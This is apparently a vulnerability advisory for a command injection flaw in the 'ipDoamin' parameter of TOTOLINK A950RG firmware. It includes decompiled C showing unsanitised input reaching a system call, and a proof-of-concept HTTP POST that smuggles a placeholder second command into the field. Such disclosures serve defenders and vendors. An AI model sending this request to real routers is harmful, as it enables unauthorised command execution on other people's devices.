# Command Injection Vulnerability in `ipDoamin`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | TOTOLINK A950RG                                              |
| Firmware Version     | V5.9c.4592_B20191022_ALL                                     |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `system.so` (function `setDiagnosisCfg`)                     |
| Data Flow            | User input retrieved via `websGetVar("ipDoamin")` → directly concatenated into `ping` command → executed via `CsteSystem`. |
| Exploit Path         | `setDiagnosisCfg` line 7: `Var = websGetVar(..., "ipDoamin", ...)` → line 8: `sprintf(v8, "ping %s ...", Var)` → line 9: `CsteSystem(v8, 0)` → arbitrary command execution. |
| Prerequisites        | No sanitization or filtering on `ipDoamin`; attacker-controlled input directly propagates into system command. |

2. Exploitation Path

```c
int __fastcall setDiagnosisCfg(int a1, int a2, int a3)
{
  const char *Var; // $v0
  char v8[132]; // [sp+18h] [-84h] BYREF

  memset(v8, 0, 0x80u);
  Var = (const char *)websGetVar(a2, "ipDoamin", "www.baidu.com");
  sprintf(v8, "ping %s -w 4 &>/var/log/pingCheck", Var);
  CsteSystem(v8, 0);
  return websSetCfgResponse(a1, a3, "0", "reserv");
}
```

3. **Vulnerable Binaries:**  `system.so` .
4. 0-Day Command Injection Exploitation Path: In the `setDiagnosisCfg` function, line 7 executes `Var = (const char *)websGetVar(a2, "ipDoamin", "www.baidu.com")`, which retrieves network input associated with the keyword `ipDoamin`. The retrieved value is subsequently concatenated and directly passed into line 9 `CsteSystem(v8, 0)`, thereby triggering a command injection vulnerability.
5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/system.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Connection: close

ipDoamin=www.baidu.com;`INJECTED_COMMAND`
```